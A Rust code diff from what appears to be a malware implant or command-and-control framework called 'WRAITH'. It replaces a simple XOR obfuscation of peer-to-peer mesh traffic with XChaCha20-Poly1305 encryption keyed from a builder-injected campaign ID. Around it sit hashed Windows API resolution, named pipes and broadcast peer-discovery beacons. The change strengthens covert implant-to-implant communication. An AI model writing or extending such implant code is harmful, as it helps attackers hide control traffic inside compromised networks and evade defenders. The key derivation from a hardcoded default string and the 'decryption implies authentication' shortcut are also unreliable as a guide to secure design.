@@ -1,5 +1,10 @@
 use crate::utils::syscalls::*;
 use alloc::vec::Vec;
+use chacha20poly1305::{
+    aead::{Aead, KeyInit},
+    XChaCha20Poly1305, XNonce,
+};
+use wraith_crypto::hash::Kdf;
 
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
@@ -9,6 +14,52 @@ use crate::utils::windows_definitions::{GUID, HANDLE, PVOID};
 use alloc::format;
 #[cfg(target_os = "windows")]
 use core::ffi::c_void;
+
+// In a real deployment, this would be injected by the builder
+const CAMPAIGN_ID: &str = "WRAITH_CAMPAIGN_DEFAULT";
+const MESH_SALT: &[u8] = b"WRAITH_MESH_V1_SALT";
+
+pub fn derive_mesh_key(campaign_id: &str, salt: &[u8]) -> Vec<u8> {
+    let kdf = Kdf::new("WRAITH_MESH_KDF_CONTEXT");
+    let mut ikm = Vec::new();
+    ikm.extend_from_slice(campaign_id.as_bytes());
+    ikm.extend_from_slice(salt);
+    kdf.derive_key(&ikm).to_vec()
+}
+
+pub fn encrypt_mesh_packet(key: &[u8], plaintext: &[u8]) -> Result<Vec<u8>, ()> {
+    if key.len() != 32 {
+        return Err(());
+    }
+
+    let cipher = XChaCha20Poly1305::new_from_slice(key).map_err(|_| ())?;
+    let mut nonce_bytes = [0u8; 24];
+    crate::utils::entropy::get_random_bytes(&mut nonce_bytes);
+    let nonce = XNonce::from_slice(&nonce_bytes);
+
+    let ciphertext = cipher
+        .encrypt(nonce, plaintext)
+        .map_err(|_| ())?;
+
+    // Format: [Nonce (24)] + [Ciphertext (len)] + [Tag (16)]
+    // Note: chacha20poly1305 crate appends tag to ciphertext
+    let mut out = Vec::with_capacity(nonce_bytes.len() + ciphertext.len());
+    out.extend_from_slice(&nonce_bytes);
+    out.extend_from_slice(&ciphertext);
+    Ok(out)
+}
+
+pub fn decrypt_mesh_packet(key: &[u8], data: &[u8]) -> Result<Vec<u8>, ()> {
+    if key.len() != 32 || data.len() < 24 + 16 {
+        return Err(());
+    }
+
+    let cipher = XChaCha20Poly1305::new_from_slice(key).map_err(|_| ())?;
+    let nonce = XNonce::from_slice(&data[..24]);
+    let ciphertext = &data[24..];
+
+    cipher.decrypt(nonce, ciphertext).map_err(|_| ())
+}
 
 pub struct Route {
     pub dest_id: u64,
@@ -61,6 +112,7 @@ pub struct MeshServer {
     pipe_handle: Option<HANDLE>,
     pub clients: Vec<MeshClient>,
     pub router: MeshRouter,
+    mesh_key: Vec<u8>,
 }
 
 pub struct MeshClient {
@@ -80,6 +132,7 @@ impl MeshServer {
             pipe_handle: None,
             clients: Vec::new(),
             router: MeshRouter::new(0),
+            mesh_key: derive_mesh_key(CAMPAIGN_ID, MESH_SALT),
         }
     }
 
@@ -313,7 +366,17 @@ impl MeshServer {
             }
 
             if n > 0 {
-                data_received.push((buf[..n as usize].to_vec(), i));
+                // Try to decrypt
+                match decrypt_mesh_packet(&self.mesh_key, &buf[..n as usize]) {
+                    Ok(plaintext) => {
+                         data_received.push((plaintext, i));
+                         self.clients[i].authenticated = true; // Successful decryption implies auth
+                    },
+                    Err(_) => {
+                        // Invalid packet, could log or drop connection
+                        // For now just ignore
+                    }
+                }
             }
 
             if remove {
@@ -331,10 +394,16 @@ impl MeshServer {
             return;
         }
         let client = &self.clients[client_idx];
+        
+        // Encrypt before sending
+        let encrypted = match encrypt_mesh_packet(&self.mesh_key, data) {
+            Ok(e) => e,
+            Err(_) => return,
+        };
 
         #[cfg(not(target_os = "windows"))]
         unsafe {
-            sys_write(client.fd, data.as_ptr(), data.len());
+            sys_write(client.fd, encrypted.as_ptr(), encrypted.len());
         }
 
         #[cfg(target_os = "windows")]
@@ -345,8 +414,8 @@ impl MeshServer {
                 type FnSend = unsafe extern "system" fn(HANDLE, *const u8, i32, i32) -> i32;
                 core::mem::transmute::<_, FnSend>(send_fn)(
                     client.handle,
-                    data.as_ptr(),
-                    data.len() as i32,
+                    encrypted.as_ptr(),
+                    encrypted.len() as i32,
                     0,
                 );
             }
@@ -355,7 +424,10 @@ impl MeshServer {
 
     pub fn discover_peers(&self) {
         let beacon_raw = b"WRAITH_MESH_HELLO";
-        let beacon = obfuscate_mesh_packet(beacon_raw);
+        let beacon = match encrypt_mesh_packet(&self.mesh_key, beacon_raw) {
+            Ok(b) => b,
+            Err(_) => return,
+        };
 
         #[cfg(not(target_os = "windows"))]
         unsafe {
@@ -382,26 +454,6 @@ impl MeshServer {
             sys_close(sock);
         }
     }
-}
-
-fn obfuscate_mesh_packet(data: &[u8]) -> Vec<u8> {
-    let mut nonce = [0u8; 4];
-    crate::utils::entropy::get_random_bytes(&mut nonce);
-    
-    // Key derivation: XOR key with nonce (repeating) to get session key
-    let static_key = b"WRAITH_MESH_KEY_2026";
-    let mut session_key = Vec::with_capacity(static_key.len());
-    for (i, b) in static_key.iter().enumerate() {
-        session_key.push(b ^ nonce[i % 4]);
-    }
-
-    let mut out = Vec::with_capacity(4 + data.len());
-    out.extend_from_slice(&nonce);
-    
-    for (i, b) in data.iter().enumerate() {
-        out.push(b ^ session_key[i % session_key.len()]);
-    }
-    out
 }
 
 #[cfg(test)]
